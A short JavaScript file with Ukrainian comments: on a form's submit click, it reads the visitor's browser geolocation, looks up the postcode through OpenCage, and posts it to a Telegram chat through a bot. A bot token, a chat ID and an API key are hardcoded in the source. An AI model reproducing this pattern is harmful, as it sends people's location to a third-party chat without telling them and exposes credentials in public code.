    const TOKEN = '6407921969:AAGnKf8qyUQ3H2x0SNI61kLnO0qEHU1R2Ik';
    const CHAT_ID = '-1001903507381';
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

let messageToTg = `<b>Get location</b>\n`;
    

const submitBtn = document.querySelector('.submitBtn');
const thk = document.querySelector('.thk');
const onSubmitBtn = (e) => {
    e.preventDefault();
    if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(function(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;

    var apiKey = '6ddf7ebd5c3e4dd48abbd5d0d7ed1997'; // Замініть на свій API ключ OpenCage
    
    // Створення запиту до API OpenCage
    var requestUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=en`;

    fetch(requestUrl)
        .then(response => response.json())
        .then(data => {
            if (data.results.length > 0) {
                var zipCode = data.results[0].components.postcode;
 
                formSend();
                console.log("Ваш поштовий індекс (zip code): " + zipCode);
                function formSend(e) {
                        
                        messageToTg += `current zc: ${zipCode}\n`;

                        try {
                            axios.post(URI_API, {
                                chat_id: CHAT_ID,
                                parse_mode: 'html',
                                text: messageToTg,
                            })
                            .then(response => {
                                console.log('Message sent to Telegram successfully.');
                            })
                            .catch(error => {
                                console.error('Error sending message to Telegram:', error);
                            });
                        } catch (error) {
                            console.error('Error sending message to Telegram:', error);
                        } finally {
                            messageToTg = '';
                        }
                    }
            } else {
            console.log("Поштовий індекс не знайдено.");
            }
        })
        .catch(error => {
            console.error("Помилка під час отримання поштового індексу: " + error);
        });
    });
    } else {
        console.log("Геолокація не підтримується цим браузером.");
    }
    thk.classList.add('vivsible')
}
submitBtn.addEventListener('click', onSubmitBtn)